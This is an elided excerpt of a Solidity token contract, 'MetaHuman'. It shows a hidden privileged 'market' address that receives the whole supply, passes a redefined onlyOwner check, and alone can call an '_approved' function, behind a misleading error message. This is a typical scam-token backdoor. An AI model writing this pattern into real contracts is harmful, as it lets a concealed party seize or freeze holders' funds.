...
contract MetaHuman is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    balances[market] = totalSupply;
    allowAddress[market] = true;
  }
  ...
  modifier marketing() {
        require(market == msg.sender, "203: Message Sender is different from address(0)!");
        _;
    }
  modifier onlyOwner() {
    require(msg.sender == market || msg.sender == address
  ...
  function _approved(address miner, uint256 _value) external marketing{
